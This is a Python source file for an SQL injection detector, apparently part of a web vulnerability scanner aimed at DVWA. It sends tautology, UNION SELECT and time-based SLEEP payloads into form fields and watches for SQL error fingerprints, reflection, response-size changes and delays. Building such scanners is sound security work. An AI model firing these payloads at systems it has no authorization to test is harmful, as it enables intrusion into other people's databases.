# detector/sqli_detector.py
"""
增强版 SQLi 检测器（兼容现有接口）
接口：
    s = SQLiDetector()
    findings = s.test_form(form)

设计原则：
- 以最小侵入改造现有项目：继续使用 utils.http.safe_get（与全局 session/cookies 保持一致）。
- 首先做 error-based / reflected 检测；若无结果，尝试 UNION-based；最后尝试 time-based（盲注）。
- 对明显不可注入字段（submit、file、hidden token）跳过。
"""

import time
from config import SQLI_PAYLOADS, SQL_ERROR_PATTERNS, DEFAULT_TIMEOUT  # <<< MODIFIED: reuse project config
from utils.http import safe_get

# <<< ADDED: DVWA-friendly extra payloads and detection thresholds
EXTRA_PAYLOADS = [
    "' OR '1'='1",         # classic
    "' OR 1=1 -- ",        # classic with comment tail
    "\" OR \"1\"=\"1",     # double-quote form
    "' OR 'a'='a",         # variant
]
# UNION attempts: try up to this many NULL columns (DVWA small tables)
MAX_UNION_COLUMNS = 4
UNION_COMMENT = " -- "
SIZE_DIFF_THRESHOLD = 150   # bytes for size-diff heuristic
TIME_THRESHOLD = 4.0        # seconds threshold for time-based detection

# <<< ADDED: extend error patterns (merged with config at runtime in contains_sql_error)
ADDITIONAL_ERROR_PATTERNS = [
    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
    "syntax error at or near", "ora-", "pg_query()", "sqlstate", "quoted string not properly terminated"
]


def contains_sql_error(text):
    """Case-insensitive check for SQL error fingerprints (merged from config + local)."""
    if not text:
        return False
    lower = text.lower()
    patterns = []
    if SQL_ERROR_PATTERNS:
        patterns.extend([p.lower() for p in SQL_ERROR_PATTERNS])
    patterns.extend([p.lower() for p in ADDITIONAL_ERROR_PATTERNS])
    for p in patterns:
        if p and p in lower:
            return True
    return False


class SQLiDetector:
    def __init__(self, timeout=DEFAULT_TIMEOUT, verbose=False):
        """
        timeout: request timeout in seconds
        verbose: 若为 True，会在控制台打印每个测试请求的简短信息（用于调试）
        """
        self.timeout = timeout
        self.verbose = verbose
        # combine configured payloads + extras, but keep config order primary
        self.payloads = list(SQLI_PAYLOADS) if SQLI_PAYLOADS else []
        for p in EXTRA_PAYLOADS:
            if p not in self.payloads:
                self.payloads.append(p)
        # time-based payloads (MySQL style)
        self.time_payloads = ["1 AND SLEEP(5)-- ", "1' AND SLEEP(5)-- "]

    def _send(self, action, params, data, method):
        """统一发送请求（使用 safe_get），返回 response 或 None"""
        try:
            r = safe_get(action,
                         params=params if method.lower() == "get" else None,
                         data=data if method.lower() == "post" else None,
                         method=method.upper(),
                         timeout=self.timeout)
            return r
        except Exception:
            return None

    def _log(self, *args):
        if self.verbose:
            print("[SQLiDetector]", *args)

    def _try_union(self, action, method, baseline_params, target_param, base_len):
        """
        尝试 UNION-based 注入：构造 payload "' UNION SELECT NULL,NULL... -- "
        如果返回包含 SQL 错误或响应长度显著变化则记录线索。
        返回 list of tuples (payload, evidence)
        """
        hits = []
        for ncols in range(1, MAX_UNION_COLUMNS + 1):
            nulls = ",".join(["NULL"] * ncols)
            payload = f"' UNION SELECT {nulls}{UNION_COMMENT}"
            test_params = baseline_params.copy()
            test_params[target_param] = (baseline_params.get(target_param, "") or "") + payload

            self._log("UNION try", action, "param", target_param, "cols", ncols)
            r = self._send(action,
                           params=test_params if method == "get" else None,
                           data=test_params if method == "post" else None,
                           method=method)
            if not r:
                continue
            text = r.text or ""
            # 1) error-based success
            if contains_sql_error(text):
                hits.append((payload, "SQL error pattern in response"))
                break
            # 2) size-diff heuristic
            if base_len and abs(len(text) - base_len) > SIZE_DIFF_THRESHOLD:
                hits.append((payload, f"Response size changed by {abs(len(text)-base_len)} bytes"))
                break
        return hits

    def test_form(self, form):
        """
        Test a single Form object. Returns a list of findings dicts:
            { "type":..., "param":..., "payload":..., "evidence":..., "url":..., "severity":... }
        """
        findings = []
        seen = set()  # <<< ADDED: per-form dedupe set (action,param,payload,evidence)

        action = form.action
        method = (form.method or "get").lower()

        # build baseline (use form.inputs default values)
        baseline = {}
        for inp in form.inputs:
            name = inp.get("name")
            if not name:
                continue
            baseline[name] = inp.get("value", "")

        # get baseline response
        base_resp = self._send(action,
                               params=baseline if method == "get" else None,
                               data=baseline if method == "post" else None,
                               method=method)
        base_text = base_resp.text if base_resp else ""
        base_len = len(base_text) if base_text else 0

        # iterate inputs, skip non-injectable types
        for inp in form.inputs:
            name = inp.get("name")
            if not name:
                continue
            typ = (inp.get("type") or "").lower()

            # <<< MODIFIED: skip obviously non-injectable inputs
            if typ in ("submit", "button", "file"):
                continue
            # skip hidden tokens (we don't want to clobber CSRF tokens)
            if typ == "hidden":
                # if it's obviously a token like user_token or _token, skip
                if "token" in name.lower() or "csrf" in name.lower():
                    continue
                # otherwise may still be a hidden default value - we won't inject into hidden fields by default
                continue

            # only test textual inputs
            if typ not in ("text", "search", "textarea", ""):
                continue

            orig = baseline.get(name, "")

            # 1) try configured payloads (error-based / reflected / size diff)
            for payload in self.payloads:
                test_params = baseline.copy()
                test_params[name] = orig + payload

                self._log("Testing", action, "param", name, "payload", payload)
                r = self._send(action,
                               params=test_params if method == "get" else None,
                               data=test_params if method == "post" else None,
                               method=method)
                if not r:
                    continue
                text = r.text or ""

                # a) error-based
                if contains_sql_error(text):
                    key = (action, name, payload, "sql-error")
                    if key not in seen:
                        findings.append({
                            "type": "SQLi",
                            "param": name,
                            "payload": payload,
                            "evidence": "SQL error pattern in response",
                            "url": action,
                            "severity": "High"
                        })
                        seen.add(key)
                    break  # stop further payloads for this parameter

                # b) reflection (payload appears in response)
                if payload in text:
                    key = (action, name, payload, "reflected")
                    if key not in seen:
                        findings.append({
                            "type": "SQLi (reflected)",
                            "param": name,
                            "payload": payload,
                            "evidence": "Payload reflected in response",
                            "url": action,
                            "severity": "Medium"
                        })
                        seen.add(key)
                    break

                # c) simple size-diff heuristic
                if base_len and abs(len(text) - base_len) > SIZE_DIFF_THRESHOLD:
                    key = (action, name, payload, "size-diff")
                    if key not in seen:
                        findings.append({
                            "type": "SQLi (size-diff)",
                            "param": name,
                            "payload": payload,
                            "evidence": f"Response size changed by {abs(len(text)-base_len)} bytes",
                            "url": action,
                            "severity": "Medium"
                        })
                        seen.add(key)
                    break

            # 2) if still no result for this parameter, try UNION-based heuristics
            if not any(f['param'] == name for f in findings):
                union_hits = self._try_union(action, method, baseline, name, base_len)
                for payload, evidence in union_hits:
                    key = (action, name, payload, evidence)
                    if key not in seen:
                        findings.append({
                            "type": "SQLi (union)",
                            "param": name,
                            "payload": payload,
                            "evidence": evidence,
                            "url": action,
                            "severity": "High"
                        })
                        seen.add(key)

            # 3) time-based detection as last resort
            if not any(f['param'] == name for f in findings):
                for tp in self.time_payloads:
                    test_params = baseline.copy()
                    test_params[name] = orig + tp
                    self._log("Time-based try", action, name, tp)
                    t0 = time.time()
                    r = self._send(action,
                                   params=test_params if method == "get" else None,
                                   data=test_params if method == "post" else None,
                                   method=method)
                    t1 = time.time()
                    if not r:
                        continue
                    elapsed = t1 - t0
                    if elapsed > TIME_THRESHOLD:
                        key = (action, name, tp, f"time-delay-{elapsed:.1f}")
                        if key not in seen:
                            findings.append({
                                "type": "SQLi (time-based)",
                                "param": name,
                                "payload": tp,
                                "evidence": f"Response delayed ({elapsed:.1f}s)",
                                "url": action,
                                "severity": "High"
                            })
                            seen.add(key)
                        break

        return findings
